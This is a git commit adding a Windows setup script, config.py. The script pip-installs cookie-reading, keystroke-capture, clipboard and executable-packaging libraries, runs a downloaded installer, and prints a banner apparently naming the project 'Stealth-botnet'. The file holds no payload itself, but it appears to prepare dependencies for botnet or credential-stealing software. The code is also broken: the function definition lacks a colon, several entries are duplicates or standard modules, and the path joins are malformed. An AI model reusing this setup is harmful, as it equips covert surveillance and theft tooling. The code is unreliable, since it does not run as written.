fff89067ca6c718f75ad51747fd9e05bb98aad60
ScRiPt1337 <26287773+ScRiPt1337@users.noreply.github.com>
2018-10-04 16:08:22 -0700

    update

---
+++ config.py
@@ -0,0 +1,38 @@
+import os
+import urllib
+dir_path = os.path.dirname(os.path.realpath(__file__))
+def ins()
+	os.system("C:\Python27\Scripts\pip.exe install pyinstaller")
+	os.system("C:\Python27\Scripts\pip.exe install simplejson")
+	os.system("C:\Python27\Scripts\pip.exe install pyperclip")
+	os.system("C:\Python27\Scripts\pip.exe install browsercookie")
+	os.system("C:\Python27\Scripts\pip.exe install pynput")
+	os.system("C:\Python27\Scripts\pip.exe install requests")
+	os.system("C:\Python27\Scripts\pip.exe install urllib")
+	os.system("C:\Python27\Scripts\pip.exe install ctypes")
+	os.system("C:\Python27\Scripts\pip.exe install sqlite3")
+	os.system("C:\Python27\Scripts\pip.exe install urllib")
+	os.system("C:\Python27\Scripts\pip install pypiwin32")
+	os.system("C:\Python27\Scripts\pip install logging")
+	os.system("C:\Python27\Scripts\pip install logging")
+	os.system("C:\Python27\Scripts\pip install pyCrypto")
+	urllib.urlretrieve("https://download.microsoft.com/download/7/9/6/796EF2E4-801B-4FC4-AB28-B59FBF6D907B/VCForPython27.msi", dir_path + "VCForPython27.msi")
+	os.system(dir_path + "VCForPython27.msi")
+	os.system("cls")
+print """
+
+
+
+  _________ __                .__         .__             ___.           __                 __   
+ /   _____//  |_  ____ _____  |  | ______ |  |__          \_ |__   _____/  |_  ____   _____/  |_ 
+ \_____ \\\   __\/ __\\\\__  \ |  | \____ \|  |  \   ______ | __ \ /  _ \   __\/    \_/ __ \   _\\
+ /        \|  | \  ___/ / __ \|  |_|  |_> >   Y  \ /_____/ | \_\ (  <_> )  | |   |  \  ___/|  |  
+/_______  /|__|  \___  >____  /____/   __/|___|  /         |___  /\____/|__| |___|  /\___  >__|  
+        \/           \/     \/     |__|        \/              \/                 \/     \/  
+        
+            
+                                                                      coded by : script1337
+                                                                      page link : https://www.facebook.com/script1337/   
+                                                                                               
+                                                                                                
+"""
